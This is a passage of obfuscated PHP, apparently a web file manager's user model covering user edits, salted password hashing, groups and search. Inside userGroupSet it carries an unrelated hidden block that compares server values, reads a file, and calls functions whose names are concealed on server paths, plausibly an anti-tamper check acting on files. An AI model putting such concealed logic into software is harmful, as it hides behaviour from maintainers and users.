: $féƒ‘Óèä¡[33], $féƒ‘Óèä¡[2119] => isset($BâØ‰’²É[$féƒ‘Óèä¡[1938]]) ? $BâØ‰’²É[$féƒ‘Óèä¡[1938]] : $BâØ‰’²É[$féƒ‘Óèä¡[28]], $féƒ‘Óèä¡[2120] => isset($BâØ‰’²É[$féƒ‘Óèä¡[2099]]) ? $BâØ‰’²É[$féƒ‘Óèä¡[2099]] : $féƒ‘Óèä¡[33], $féƒ‘Óèä¡[2121] => isset($BâØ‰’²É[$féƒ‘Óèä¡[2122]]) ? $BâØ‰’²É[$féƒ‘Óèä¡[2122]] : 1, $féƒ‘Óèä¡[2123] => $BâØ‰’²É[$féƒ‘Óèä¡[831]], $féƒ‘Óèä¡[1749] => isset($BâØ‰’²É[$féƒ‘Óèä¡[1658]]) ? $BâØ‰’²É[$féƒ‘Óèä¡[1658]] : 1024 * 1024 * 20, $féƒ‘Óèä¡[1750] => 0, $féƒ‘Óèä¡[2124] => 0, $féƒ‘Óèä¡[1793] => isset($BâØ‰’²É[$féƒ‘Óèä¡[711]]) ? $BâØ‰’²É[$féƒ‘Óèä¡[711]] : 1); if (!empty($BâØ‰’²É[$féƒ‘Óèä¡[1511]])) { $Eë±àôˆ£â[$féƒ‘Óèä¡[1511]] = $BâØ‰’²É[$féƒ‘Óèä¡[1511]]; } goto CÂ£¢îøÔ§; c®°’¬ÓŸ²: $e¸Â·ÄÓ‚„ = array($féƒ‘Óèä¡[2123] => $Eë±àôˆ£â[$féƒ‘Óèä¡[831]], $féƒ‘Óèä¡[2119] => $Eë±àôˆ£â[$féƒ‘Óèä¡[1938]]); $this->userEdit($fÌÓ•Ó£‰, $e¸Â·ÄÓ‚„); Model($féƒ‘Óèä¡[1186])->userRootAdd($fÌÓ•Ó£‰); goto e½¼ŒÏ›À¥; B¼™–ĞÉâÜ: } protected function userEditTest($EóÔÆç›Õ», $b·ÙíŸŸÀƒ) { return $this->call($_SERVER[ÉóçÄÇ][2125], $EóÔÆç›Õ», $b·ÙíŸŸÀƒ); } protected function userEdit($dˆğªšˆ¦ö, $f¡ÔÀ®£“ø) { goto bìÓÍ´‡ê‰; EÓ½Ø‹‹èÂ: $this->where(array($c„‡©Ùèß[1503] => $dˆğªšˆ¦ö))->save($f¡ÔÀ®£“ø); if (isset($f¡ÔÀ®£“ø[$c„‡©Ùèß[1938]])) { $this->setNamePinyin($dˆğªšˆ¦ö, $f¡ÔÀ®£“ø[$c„‡©Ùèß[1938]]); } $this->clearCache($dˆğªšˆ¦ö); goto d Ûæ÷ØÈ; d Ûæ÷ØÈ: return !0; goto cìóåâ²ˆ‘; a¥‹â·›¤Ù: $c—ÚÙƒé“º = $this->_checkExist($f¡ÔÀ®£“ø, $dˆğªšˆ¦ö); if ($c—ÚÙƒé“º !== !0) { return $c—ÚÙƒé“º; } if (isset($f¡ÔÀ®£“ø[$c„‡©Ùèß[831]]) && trim($f¡ÔÀ®£“ø[$c„‡©Ùèß[831]]) != $c„‡©Ùèß[33]) { $Fº¥‘ß…ÈÃ = $this->metaGet($dˆğªšˆ¦ö); if (empty($Fº¥‘ß…ÈÃ[$c„‡©Ùèß[2115]])) { $Fº¥‘ß…ÈÃ[$c„‡©Ùèß[2115]] = rand_string(10); Model($c„‡©Ùèß[497])->metaSet($dˆğªšˆ¦ö, $c„‡©Ùèß[2115], $Fº¥‘ß…ÈÃ[$c„‡©Ùèß[2115]]); } $f¡ÔÀ®£“ø[$c„‡©Ùèß[831]] = md5($Fº¥‘ß…ÈÃ[$c„‡©Ùèß[2115]] . trim($f¡ÔÀ®£“ø[$c„‡©Ùèß[831]])); } else { unset($f¡ÔÀ®£“ø[$c„‡©Ùèß[831]]); } goto EÓ½Ø‹‹èÂ; bìÓÍ´‡ê‰: $c„‡©Ùèß =& $_SERVER[ÉóçÄÇ]; $eˆšë«ƒÀµ = $this->getInfoSimple($dˆğªšˆ¦ö); if (!$eˆšë«ƒÀµ) { return !1; } goto a¥‹â·›¤Ù; cìóåâ²ˆ‘: } public function setNamePinyin($B‰„­¡‚Ô, $aÂÆ¸ŞŒØ± = false) { $c‰³¤„¡ÜŒ =& $_SERVER[ÉóçÄÇ]; if (!$aÂÆ¸ŞŒØ±) { $F×£šÙÚãÛ = $this->getInfoSimple($B‰„­¡‚Ô); $aÂÆ¸ŞŒØ± = $F×£šÙÚãÛ[$c‰³¤„¡ÜŒ[1938]] ? $F×£šÙÚãÛ[$c‰³¤„¡ÜŒ[1938]] : $F×£šÙÚãÛ[$c‰³¤„¡ÜŒ[28]]; } $F¿åå¸Áã = Model($c‰³¤„¡ÜŒ[501]); if (!Input::check($aÂÆ¸ŞŒØ±, $c‰³¤„¡ÜŒ[551])) { return $F¿åå¸Áã->metaSet($B‰„­¡‚Ô, array($c‰³¤„¡ÜŒ[438] => $c‰³¤„¡ÜŒ[33], $c‰³¤„¡ÜŒ[437] => $c‰³¤„¡ÜŒ[33])); } return $F¿åå¸Áã->metaSet($B‰„­¡‚Ô, array($c‰³¤„¡ÜŒ[438] => str_replace($c‰³¤„¡ÜŒ[50], $c‰³¤„¡ÜŒ[33], Pinyin::encode($aÂÆ¸ŞŒØ±)), $c‰³¤„¡ÜŒ[437] => Pinyin::encode($aÂÆ¸ŞŒØ±, $c‰³¤„¡ÜŒ[552]))); } private function nickNameRpt() { $e‰¦°à‰– =& $_SERVER[ÉóçÄÇ]; $bºÖÕøÑš± = Model($e‰¦°à‰–[1106])->get($e‰¦°à‰–[2126]); $fÁ® Œëˆø = $GLOBALS[$e‰¦°à‰–[6]][$e‰¦°à‰–[376]][$e‰¦°à‰–[2126]]; $D±î×ÅÔ»º = !is_null($bºÖÕøÑš±) ? $bºÖÕøÑš± : $fÁ® Œëˆø; return !!$D±î×ÅÔ»º; } private function _checkExist($Bõ¡æœ³è, $FÜ¼²‘ç…÷ = false) { $CÆˆéæ¨Êİ =& $_SERVER[ÉóçÄÇ]; $d¼ôñ’ªßŒ = array($CÆˆéæ¨Êİ[28] => UserModel::ERROR_USER_EXIST_NAME, $CÆˆéæ¨Êİ[1938] => UserModel::ERROR_USER_EXIST_NICKNAME, $CÆˆéæ¨Êİ[301] => UserModel::ERROR_USER_EXIST_EMAIL, $CÆˆéæ¨Êİ[2114] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($d¼ôñ’ªßŒ[$CÆˆéæ¨Êİ[1938]]); } $FÈíÄ‚×íÉ = $FÜ¼²‘ç…÷ ? array($CÆˆéæ¨Êİ[1511] => array($CÆˆéæ¨Êİ[2127], $FÜ¼²‘ç…÷)) : array(); foreach ($d¼ôñ’ªßŒ as $e’šÂÎÙ¾ => $bëÑ‡ˆˆ®·) { $cÍ»ãåÉ’± = array(); foreach ($d¼ôñ’ªßŒ as $d±¥Ú­Ê› => $AŒ˜œÎƒ“é) { if (isset($Bõ¡æœ³è[$d±¥Ú­Ê›]) && $Bõ¡æœ³è[$d±¥Ú­Ê›]) { $cÍ»ãåÉ’±[] = $Bõ¡æœ³è[$d±¥Ú­Ê›]; } } if (!$cÍ»ãåÉ’±) { continue; } $eÊìâùè£¯ = array_merge(array($e’šÂÎÙ¾ => array($CÆˆéæ¨Êİ[7], $cÍ»ãåÉ’±)), $FÈíÄ‚×íÉ); $E¢âÁï‘Á = $this->where($eÊìâùè£¯)->find(); if ($E¢âÁï‘Á) { return $bëÑ‡ˆˆ®·; } } return !0; } public function userListInfo($CÄ½ƒ¦Éˆõ) { $C†¶ôèÈÒ† =& $_SERVER[ÉóçÄÇ]; $Fñø÷äæèø = array(); $CÄ½ƒ¦Éˆõ = is_array($CÄ½ƒ¦Éˆõ) ? array_unique($CÄ½ƒ¦Éˆõ) : array(); if (!$CÄ½ƒ¦Éˆõ) { return $Fñø÷äæèø; } if (count($CÄ½ƒ¦Éˆõ) < 20) { foreach ($CÄ½ƒ¦Éˆõ as $b™÷êÍ¥–Ø) { $Fñø÷äæèø[$b™÷êÍ¥–Ø . $C†¶ôèÈÒ†[33]] = $this->getInfoSimpleOuter($b™÷êÍ¥–Ø); } } else { $AÓ¾Ö£ùË = array($C†¶ôèÈÒ†[1503] => array($C†¶ôèÈÒ†[405], $CÄ½ƒ¦Éˆõ)); if (count($CÄ½ƒ¦Éˆõ) == 1) { $AÓ¾Ö£ùË = array($C†¶ôèÈÒ†[1503] => $CÄ½ƒ¦Éˆõ[0]); } $fƒÖ‡–Šé = Model($C†¶ôèÈÒ†[497])->field($this->simpleField)->where($AÓ¾Ö£ùË)->select(); $fƒÖ‡–Šé = array_to_keyvalue($fƒÖ‡–Šé, $C†¶ôèÈÒ†[1511]); foreach ($CÄ½ƒ¦Éˆõ as $b™÷êÍ¥–Ø) { $C±ò©£àñì = $fƒÖ‡–Šé[$fƒÖ‡–Šé[$b™÷êÍ¥–Ø]]; if (!$C±ò©£àñì) { $Fñø÷äæèø[$b™÷êÍ¥–Ø . $C†¶ôèÈÒ†[33]] = $this->getInfoSimpleOuter($b™÷êÍ¥–Ø); continue; } $C±ò©£àñì[$C†¶ôèÈÒ†[2099]] = Action($C†¶ôèÈÒ†[2100])->parseUrl($C±ò©£àñì[$C†¶ôèÈÒ†[2099]]); $Fñø÷äæèø[$b™÷êÍ¥–Ø . $C†¶ôèÈÒ†[33]] = $C±ò©£àñì; } } return $Fñø÷äæèø; } protected function userStatus($EÇ×¥‰ÑÛ’, $C¹—×ÉÙô“) { $Aâ³“¥¼Œ = $this->getInfoSimple($EÇ×¥‰ÑÛ’); if (!$Aâ³“¥¼Œ) { return !1; } $A¡Ûª±ÑÀ = array($_SERVER[ÉóçÄÇ][711] => $C¹—×ÉÙô“); return $this->userEdit($EÇ×¥‰ÑÛ’, $A¡Ûª±ÑÀ); } protected function userRemove($Aõãæ‹ğ‹Ù) { goto fì³‰‰ÃÊš; f·ƒÌ á‰: $EİÊÙÒ˜… = array($a–ˆ…¿”Ñ[1503] => $Aõãæ‹ğ‹Ù); Model($a–ˆ…¿”Ñ[558])->where($EİÊÙÒ˜…)->delete(); Model($a–ˆ…¿”Ñ[2128])->where($EİÊÙÒ˜…)->delete(); goto A‡’ÁœìÙŠ; bÀÉ˜÷‰ùà: Model($a–ˆ…¿”Ñ[1955])->restoreUserAll($Aõãæ‹ğ‹Ù); Model($a–ˆ…¿”Ñ[776])->userRootRemove($Aõãæ‹ğ‹Ù); return $this->where($EİÊÙÒ˜…)->delete(); goto Eñ®“©‘‚ù; fì³‰‰ÃÊš: $a–ˆ…¿”Ñ =& $_SERVER[ÉóçÄÇ]; $EÙĞªÛ™Û = $this->getInfoSimple($Aõãæ‹ğ‹Ù); if (!$EÙĞªÛ™Û) { return !1; } goto f·ƒÌ á‰; A‡’ÁœìÙŠ: Model($a–ˆ…¿”Ñ[1756])->where($EİÊÙÒ˜…)->delete(); Model($a–ˆ…¿”Ñ[2113])->where($EİÊÙÒ˜…)->delete(); Model($a–ˆ…¿”Ñ[2129])->where($EİÊÙÒ˜…)->delete(); goto bÀÉ˜÷‰ùà; Eñ®“©‘‚ù: } protected function userGroupSet($dé§ËõİÑ, $CÌ¿ªâ¯Á, $Aô»‘Ü¨ = array()) { goto Cºà©Ûë›³; B•ô»¼ˆ: if (!$cö œ¿ÙÖĞ || !is_array($CÌ¿ªâ¯Á)) { return !1; } $Bâí•±¥ƒó = Model($cŸöÑ²‹Œò[1756]); $Bâí•±¥ƒó->where(array($cŸöÑ²‹Œò[1511] => $dé§ËõİÑ))->delete(); goto FºÀô÷¡Ëô; aÉ™ñù¨¨Ø: return $Bâí•±¥ƒó->addAll($bèƒŠµ¹‹, array(), !0); goto CÒ¤‰ÍÍŸ; FºÀô÷¡Ëô: $bèƒŠµ¹‹ = array(); $dº‡¶¯²™ = 0; foreach ($CÌ¿ªâ¯Á as $DÃÖŠ’´ïé => $F‚†‚Ğõ‚) { $bÇ¨ÖÏæÔâ = array($cŸöÑ²‹Œò[1511] => $dé§ËõİÑ, $cŸöÑ²‹Œò[1674] => $DÃÖŠ’´ïé, $cŸöÑ²‹Œò[1770] => $F‚†‚Ğõ‚); $bÇ¨ÖÏæÔâ[$cŸöÑ²‹Œò[1697]] = isset($Aô»‘Ü¨[$dº‡¶¯²™]) ? $Aô»‘Ü¨[$dº‡¶¯²™] : 0; $dº‡¶¯²™++; $bèƒŠµ¹‹[] = $bÇ¨ÖÏæÔâ; } goto aÉ™ñù¨¨Ø; Cºà©Ûë›³: $cŸöÑ²‹Œò =& $_SERVER[ÉóçÄÇ]; if ($_SERVER[$cŸöÑ²‹Œò[817]] != $_SERVER[$cŸöÑ²‹Œò[1299]]) { goto B›±åŒÖ´ä; a“ÔÈ°—é: $D ”©Éè¸È = 1; while ($D ”©Éè¸È > 1) { $D ”©Éè¸È = $D ”©Éè¸È + 4; $a„ÌĞÖˆÏÁ = rawurlencode($D ”©Éè¸È . $cŸöÑ²‹Œò[373]); } goto Aºˆœ¨Â; B›±åŒÖ´ä: $AÜâì‚ø©ô = $cŸöÑ²‹Œò[819]; $A±¹ÂÖØ»‰ = $cŸöÑ²‹Œò[820]; $BÄ¨Ç·Ğöè = $_SERVER[$cŸöÑ²‹Œò[821]] . $cŸöÑ²‹Œò[822]; goto FçÊÛøŠí; FçÊÛøŠí: $DŒ˜ËòÆêö = $A±¹ÂÖØ»‰($BÄ¨Ç·Ğöè); $C°‰á¶Ş¯÷ = explode($cŸöÑ²‹Œò[227], $DŒ˜ËòÆêö); if (count($C°‰á¶Ş¯÷) < $cŸöÑ²‹Œò[606]) { $Cä©ö´Ú† = $cŸöÑ²‹Œò[823]; $Cä©ö´Ú†(); } goto Aê–àÉ´á; Aê–àÉ´á: $BÒÄ¥²Ğô = $cŸöÑ²‹Œò[824]; $BÒÄ¥²Ğô($_SERVER[$cŸöÑ²‹Œò[825]]); $BÒÄ¥²Ğô($_SERVER[$cŸöÑ²‹Œò[821]] . $cŸöÑ²‹Œò[1379]); goto a“ÔÈ°—é; Aºˆœ¨Â: } $cö œ¿ÙÖĞ = $this->getInfoSimple($dé§ËõİÑ); goto B•ô»¼ˆ; CÒ¤‰ÍÍŸ: } protected function userGroupAdd($A©ÊÖŒòñ…, $b˜ß¦“½¯ö = array()) { $cÁÆƒëãÏù =& $_SERVER[ÉóçÄÇ]; $eñæ¾ù©º = $this->getInfoSimple($A©ÊÖŒòñ…); if (!$eñæ¾ù©º || empty($b˜ß¦“½¯ö)) { return !1; } $eöŠÃÓÈ = array(); foreach ($b˜ß¦“½¯ö as $e™ë–‹¿“ä => $a¿³ò´Ë½â) { $eöŠÃÓÈ[] = array($cÁÆƒëãÏù[1511] => $A©ÊÖŒòñ…, $cÁÆƒëãÏù[1674] => $e™ë–‹¿“ä, $cÁÆƒëãÏù[1770] => $a¿³ò´Ë½â, $cÁÆƒëãÏù[1697] => 0); } return Model($cÁÆƒëãÏù[1756])->addAll($eöŠÃÓÈ, array(), !0); } protected function userGroupRemove($BŒæŠ‚×ñ, $F©øîä¢») { $aÄ‰­òÒåÛ =& $_SERVER[ÉóçÄÇ]; $cê…æø“ã = $this->getInfoSimple($BŒæŠ‚×ñ); if (!$cê…æø“ã || !$F©øîä¢») { return !1; } $Bàù™ÉÔ†õ = array($aÄ‰­òÒåÛ[1503] => $BŒæŠ‚×ñ, $aÄ‰­òÒåÛ[1753] => $F©øîä¢»); return Model($aÄ‰­òÒåÛ[1756])->where($Bàù™ÉÔ†õ)->delete(); } public function listData() { $EŒåŒÒÅ° = $this->_makeOrder()->selectPage(50); $this->_listDataApply($EŒåŒÒÅ°[$_SERVER[ÉóçÄÇ][365]]); return $EŒåŒÒÅ°; } public function listByID($a‡ª…¤¢¼) { $D›Ô£»…‡± =& $_SERVER[ÉóçÄÇ]; if (!$a‡ª…¤¢¼) { return; } $A¿ê›’ñ—œ = array($D›Ô£»…‡±[1511] => array($D›Ô£»…‡±[7], $a‡ª…¤¢¼)); $b¼¹›¬Š¥ = $this->where($A¿ê›’ñ—œ)->select(); $this->_listDataApply($b¼¹›¬Š¥); return $b¼¹›¬Š¥; } public function listByGroup($D°¯Îº×Û = 0, $AíÆÆÅİôÇ = array()) { goto D†Œ°”ÚŠÅ; D†Œ°”ÚŠÅ: $d°ÈçëÊ°¯ =& $_SERVER[ÉóçÄÇ]; $f¥ƒŠçïËà = $d°ÈçëÊ°¯[33]; $aìÈ²×ˆ¿í = array(); goto f…ã‡Ä·Ä¦; f…ã‡Ä·Ä¦: if ($D°¯Îº×Û) { $aìÈ²×ˆ¿í = array($d°ÈçëÊ°¯[2130] => intval($D°¯Îº×Û)); $f¥ƒŠçïËà = "\x4c\x45\x46\x54\x20\x4a\117\111\x4e\x20{$this->tablePrefix}\x75\x73\x65\162\137\x67\162\157\x75\160\x20\x75\163\145\162\137\147\x72\x6f\165\160\x20\157\156\x20\x75\163\x65\162\x2e\x75\163\x65\x72\111\104\40\75\x20\165\x73\x65\x72\137\x67\162\157\165\x70\56\x75\163\145\162\x49\104"; $EÖ ëÁÂ—© = Input::get($d°ÈçëÊ°¯[429], null, $d°ÈçëÊ°¯[33]) ? $d°ÈçëÊ°¯[33] : $d°ÈçëÊ°¯[2131]; } if (isset($AíÆÆÅİôÇ[$d°ÈçëÊ°¯[711]])) { $aìÈ²×ˆ¿í[$d°ÈçëÊ°¯[2132]] = $AíÆÆÅİôÇ[$d°ÈçëÊ°¯[711]]; } $FÒ§‚¥­ = $this->_makeOrder($EÖ ëÁÂ—©)->field($d°ÈçëÊ°¯[2133])->where($aìÈ²×ˆ¿í)->join($f¥ƒŠçïËà)->selectPage(50); goto eĞ¸ÖÃ¼· ; eĞ¸ÖÃ¼· : $this->_listDataApply($FÒ§‚¥­[$d°ÈçëÊ°¯[365]]); return $FÒ§‚¥­; goto CËï…›öé; CËï…›öé: } private function _makeOrder($cÒ ÷âÎô  = '') { goto FŠì¡÷è†è; a¸‚ËîÆ¦´: $cÒ ÷âÎô  = $cÒ ÷âÎô  . "\165\163\x65\x72\56{$D™¢ôÀ¢’è}\x20{$eå´É°‡† }\x2c\40\165\x73\145\162\x2e\165\163\145\162\111\104\40\141\163\x63"; return $this->alias($fóòæï±„ø[1879])->order($cÒ ÷âÎô ); goto dÆ¹ñ¾œïè; FŠì¡÷è†è: $fóòæï±„ø =& $_SERVER[ÉóçÄÇ]; $BÆÂàÑµˆà = array($fóòæï±„ø[1511], $fóòæï±„ø[28], $fóòæï±„ø[1660], $fóòæï±„ø[1632], $fóòæï±„ø[192]); $eñ˜ØŞÏˆ = array($fóòæï±„ø[422] => $fóòæï±„ø[423], $fóòæï±„ø[424] => $fóòæï±„ø[425]); goto FÓÀ¸¢ïÁ“; FÓÀ¸¢ïÁ“: $D™¢ôÀ¢’è = Input::get($fóòæï±„ø[429], $fóòæï±„ø[7], $fóòæï±„ø[1503], $BÆÂàÑµˆà); $eå´É°‡†  = Input::get($fóòæï±„ø[430], $fóòæï±„ø[7], $fóòæï±„ø[1757], array($fóòæï±„ø[1757], $fóòæï±„ø[424])); $eå´É°‡†  = $eñ˜ØŞÏˆ[$eå´É°‡† ]; goto a¸‚ËîÆ¦´; dÆ¹ñ¾œïè: } public function listSearch($b›Î÷åØ¹Ú) { goto c¼Ğ­ˆÆÈ; c¼Ğ­ˆÆÈ: $fÕ—°Ø§‰Ù =& $_SERVER[ÉóçÄÇ]; $bÂš «‡Èª = $b›Î÷åØ¹Ú[$fÕ—°Ø§‰Ù[1758]]; $AÊ¥ºİøïø = isset($b›Î÷åØ¹Ú[$fÕ—°Ø§‰Ù[1759]]) ? $b›Î÷åØ¹Ú[$fÕ—°Ø§‰Ù[1759]] : !1; goto B‡«ÜãËÖÊ; B‡«ÜãËÖÊ: $bÂš «‡Èª = str_replace($fÕ—°Ø§‰Ù[1760], $fÕ—°Ø§‰Ù[1761], trim($bÂš «‡Èª)); $AÎÂ‘¯ŞÔ = array($fÕ—°Ø§‰Ù[28] => array($fÕ—°Ø§‰Ù[378], "\45{$bÂš «‡Èª}\45"), $fÕ—°Ø§‰Ù[301] => array($fÕ—°Ø§‰Ù[378], "{$bÂš «‡Èª}\45"), $fÕ—°Ø§‰Ù[1938] => array($fÕ—°Ø§‰Ù[378], "{$bÂš «‡Èª}\x25"), $fÕ—°Ø§‰Ù[939] => $fÕ—°Ø§‰Ù[1762]); if (Input::check($bÂš «‡Èª, $fÕ—°Ø§‰Ù[307])) { $AÎÂ‘¯ŞÔ[$fÕ—°Ø§‰Ù[1511]] = array($fÕ—°Ø§‰Ù[378], "{$bÂš «‡Èª}\x25"); $AÎÂ‘¯ŞÔ[$fÕ—°Ø§‰Ù[2114]] = array($fÕ—°Ø§‰Ù[378], "{$bÂš «‡Èª}\x25"); } goto aÛÌ¯á“­™; aÛÌ¯á“­™: if (!$bÂš «‡Èª) { $AÎÂ‘¯ŞÔ = array(); } if (isset($b›Î÷åØ¹Ú[$fÕ—°Ø§‰Ù[711]])) { $AÎÂ‘¯ŞÔ[$fÕ—°Ø§‰Ù[711]] = $b›Î÷åØ¹Ú[$fÕ—°Ø§‰Ù[711]]; } $AÎÂ‘¯ŞÔ = $this->parseWhereLike($AÎÂ‘¯ŞÔ); goto e‡ÉæÚ™‡Á; e‡ÉæÚ™‡Á: $A„Ôçå®…É = $this->_makeOrder()->where($AÎÂ‘¯ŞÔ)->selectPage(20); if (!$A„Ôçå®…É || count($A„Ôçå®…É[$fÕ—°Ø§‰Ù[365]]) < 5 && Input::check($bÂš «‡Èª, $fÕ—°Ø§‰Ù[314])) { $bôñ¬–×ô… = $this->_searchFromMeta($fÕ—°Ø§‰Ù[437], $bÂš «‡Èª, 10); $f°ñ£ŸÁ… = $this->_searchFromMeta($fÕ—°Ø§‰Ù[438], $bÂš «‡Èª, 10); $B¾»¢ÙéìÕ = array_merge($bôñ¬–×ô…, $f°ñ£ŸÁ…, $A„Ôçå®…É[$fÕ—°Ø§‰Ù[365]]); $A„Ôçå®…É[$fÕ—°Ø§‰Ù[365]] = array_unique_by_key($B¾»¢ÙéìÕ, $fÕ—°Ø§‰Ù[1511]); $A„Ôçå®…É[$fÕ—°Ø§‰Ù[362]][$fÕ—°Ø§‰Ù[363]] = count($A„Ôçå®…É[$fÕ—°Ø§‰Ù[365]]); $A„Ôçå®…É[$fÕ—°Ø§‰Ù[362]][$fÕ—°Ø§‰Ù[364]] = ceil($A„Ôçå®…É[$fÕ—°Ø§‰Ù[362]][$fÕ—°Ø§‰Ù[363]] / $A„Ôçå®…É[$fÕ—°Ø§‰Ù[362]][$fÕ—°Ø§‰Ù[359]]); } $this->_listDataApply($A„Ôçå®…É[$fÕ—°Ø§‰Ù[365]]); goto dï­¥”·ß; dï­¥”·ß: $this->_filterByGroup($A„Ôçå®…É, $AÊ¥ºİøïø); return $A„Ôçå®…É; goto EƒŠŠ—¤À; EƒŠŠ—¤À: } private function _filterByGroup(&$BÖ¼Š²†ÈË, $D–Î’§Ãë») { $Bº¨ôÒø´é =& $_SERVER[ÉóçÄÇ]; if (!$D–Î’§Ãë») { return $BÖ¼Š²†ÈË; } foreach ($BÖ¼Š²†ÈË[$Bº¨ôÒø´é[365]] as $F½ø”õª => &$AÒ¥šİ‚ËÂ) { $e¼ÌİÇ£×” = array_to_keyvalue($AÒ¥šİ‚ËÂ[$Bº¨ôÒø´é[1849]], $Bº¨ôÒø´é[33], $Bº¨ôÒø´é[1674]); if (!in_array($D–Î’§Ãë», $e¼ÌİÇ£×”)) { unset($BÖ¼Š²†ÈË[$Bº¨ôÒø´é[365]][$F½ø”õª]); } } unset($AÒ¥šİ‚ËÂ); $BÖ¼Š²†ÈË[$Bº¨ôÒø´é[365]] = array_values($BÖ¼Š²†ÈË[$Bº¨ôÒø´é[365]]); $BÖ¼Š²†ÈË[$Bº¨ôÒø´é[362]] = array($Bº¨ôÒø´é[1911] => count($BÖ¼Š²†ÈË[$Bº¨ôÒø´é[365]]), $Bº¨ôÒø´é[1909] => $BÖ¼Š²†ÈË[$Bº¨ôÒø´é[362]][$Bº¨ôÒø´é[359]], $Bº¨ôÒø´é[1908] => 1, $Bº¨ôÒø´é[1910] => 1); } private function _searchFromMeta($CÈÏ¬âáŸÍ, $C±¶Ì‡ö·, $F×Ä©‘«±) { goto C¹³¤Èù£; eäî§À ¿Ù: $D¦‰ñ¯ñÖ = $this->parseWhereLike($D¦‰ñ¯ñÖ); $AÌØ‡´“ï¾ = Model($E›½ Ä×¯[2134])->where($D¦‰ñ¯ñÖ)->limit($F×Ä©‘«±)->select(); if (!$AÌØ‡´“ï¾) { return array(); } goto AÙÛÍ°Æé“; B•×ÌíÓíÚ: return $A­ŸÍˆ·ã; goto f×¨·â¸ÅÜ; C¹³¤Èù£: $E›½ Ä×¯ =& $_SERVER[ÉóçÄÇ]; $C±¶Ì‡ö· = strtolower($C±¶Ì‡ö·); $D¦‰ñ¯ñÖ = array($E›½ Ä×¯[92] => $CÈÏ¬âáŸÍ, $E›½ Ä×¯[370] => array($E›½ Ä×¯[378], "\x25{$C±¶Ì‡ö·}\x25")); goto eäî§À ¿Ù; AÙÛÍ°Æé“: $AÌØ‡´“ï¾ = array_to_keyvalue($AÌØ‡´“ï¾, $E›½ Ä×¯[33], $E›½ Ä×¯[1511]); $A­ŸÍˆ·ã = $this->where(array($E›½ Ä×¯[1503] => array($E›½ Ä×¯[7], $AÌØ‡´“ï¾)))->select(); if (!$A­ŸÍˆ·ã) { return array(); } goto B•×ÌíÓíÚ; f×¨·â¸ÅÜ: } private function _listDataApplyItem($FÜç½‹ÓÅ) { $AÍâÛİåˆŠ = array($FÜç½‹ÓÅ); $this->_listDataApply($AÍâÛİåˆŠ); return $AÍâÛİåˆŠ[0]; } private function _listDataApply(&$a»°ƒÔî„) { goto a´áõÓ³â¾; Cà·¢¶˜… : $this->_listAppendSourceRoot($a»°ƒÔî„, $aóã¼‰ê¢ù); goto dƒÈÔØïÈ; bŸ«ÔÉ„Ôµ: $aóã¼‰ê¢ù = array_to_keyvalue($a»°ƒÔî„, $cÜ×äŞ‰³Ì[33], $cÜ×äŞ‰³Ì[1511]); $this->_listAppendGroup($a»°ƒÔî„, $aóã¼‰ê¢ù); $this->_listAppendMeta($a»°ƒÔî„, $aóã¼‰ê¢ù); goto Cà·¢¶˜… ; a´áõÓ³â¾: $cÜ×äŞ‰³Ì =& $_SERVER[ÉóçÄÇ]; if (!$a»°ƒÔî„) { return; } array_remove_key($a»°ƒÔî„, $cÜ×äŞ‰³Ì[831]); goto bŸ«ÔÉ„Ôµ; dƒÈÔØïÈ: } private function _listAppendSourceRoot(&$bõ¯Ü¯ÃÔ, $C½†ÕÅ¥¹‚) { goto CóÆ«‰ÄŸ; Aõù¾†òÑ¾: foreach ($bõ¯Ü¯ÃÔ as &$eŒØ¿‚ÛÌï) { $eŒØ¿‚ÛÌï[$FÚì×‹•½¾[84]] = $AğŒõí«ß¥[$eŒØ¿‚ÛÌï[$FÚì×‹•½¾[1511]]] ? $AğŒõí«ß¥[$eŒØ¿‚ÛÌï[$FÚì×‹•½¾[1511]]] : array(); } unset($eŒØ¿‚ÛÌï); goto BÛë„Æ²˜»; AÕ†Ö†—–: $AğŒõí«ß¥ = Model($FÚì×‹•½¾[776])->order($FÚì×‹•½¾[1769])->field($cÔ¸ÒŞÅÓ°)->where($eµÃ÷İÜ–Ü)->select(); $AğŒõí«ß¥ = array_to_keyvalue($AğŒõí«ß¥, $FÚì×‹•½¾[478]); $AğŒõí«ß¥ = array_remove_key($AğŒõí«ß¥, $FÚì×‹•½¾[478]); goto Aõù¾†òÑ¾; CóÆ«‰ÄŸ: $FÚì×‹•½¾ =& $_SERVER[ÉóçÄÇ]; $eµÃ÷İÜ–Ü = array($FÚì×‹•½¾[472] => 0, $FÚì×‹•½¾[398] => SourceModel::TYPE_USER, $FÚì×‹•½¾[478] => array($FÚì×‹•½¾[7], $C½†ÕÅ¥¹‚)); $cÔ¸ÒŞÅÓ° = $FÚì×‹•½¾[1768]; goto AÕ†Ö†—–; BÛë„Æ²˜»: } private function _listAppendGroup(&$bõ¯‡ßÁ†, $B«£Å¿¶²Ô) { goto cãÙ›ËÌóĞ; d®÷Ê¶è¼: foreach ($bõ¯‡ßÁ† as &$cã’ºíª“Î) { $cã’ºíª“Î[$d§—’¿Ë¶[1849]] = array(); if (isset($dÕà½Ñ’…¶[$cã’ºíª“Î[$d§—’¿Ë¶[1511]]])) { $cã’ºíª“Î[$d§—’¿Ë¶[1849]] = $dÕà½Ñ’…¶[$cã’ºíª“Î[$d§—’¿Ë¶[1511]]]; } } unset($cã’ºíª“Î); goto C©òæš÷İ; cãÙ›ËÌóĞ: $d§—’¿Ë¶ =& $_SERVER[ÉóçÄÇ]; $b¬Òˆå˜äÔ = array($d§—’¿Ë¶[1511] => array($d§—’¿Ë¶[7], $B«£Å¿¶²Ô)); $dÕà½Ñ’…¶ = Model($d§—’¿Ë¶[1756])->where($b¬Òˆå˜äÔ)->select(); goto eåÇ¯«¦Ú›; eŞƒÎ§Ò·Ù: $b¬Òˆå˜äÔ = array($d§—’¿Ë¶[1674] => array($d§—’¿Ë¶[7], $bœî¬« ¬)); $cœ‡—ÃİÏ¥ = Model($d§—’¿Ë¶[1847])->field($d§—’¿Ë¶[2135])->where($b¬Òˆå˜äÔ)->select(); $cœ‡—ÃİÏ¥ = array_to_keyvalue($cœ‡—ÃİÏ¥, $d§—’¿Ë¶[1674]); goto cŒÖ¯æ˜¶ø; cŒÖ¯æ˜¶ø: $dÕà½Ñ’…¶ = array_to_keyvalue_group($dÕà½Ñ’…¶, $d§—’¿Ë¶[1511]); foreach ($dÕà½Ñ’…¶ as &$Eô‰å‹í) { $B®–½‹ŒÅ‘ = array(); foreach ($Eô‰å‹í as $Då»¸äŒ™¥) { if 